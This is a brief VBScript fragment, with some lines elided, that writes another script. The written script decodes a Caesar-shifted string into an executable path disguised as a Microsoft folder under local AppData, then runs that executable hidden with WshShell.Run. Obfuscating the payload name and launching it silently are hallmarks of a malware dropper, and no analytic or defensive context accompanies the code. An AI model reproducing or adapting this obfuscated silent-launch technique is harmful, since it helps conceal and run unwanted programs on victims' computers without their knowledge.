...
file.WriteLine("obfuscatedLine = ""_Plfurvriw_Lqwhuphgldwh_gdwdsurfhvv1h{h""")
...
file.WriteLine("exeFilePath = localAppDataDir & getString(obfuscatedLine)")
file.WriteLine("WshShell.Run exeFilePath, 0, False") ' Run the executable silently
file.WriteLine("' Executable Path: ' & localAppDataDir & getString(obfuscatedLine)")
file.Close
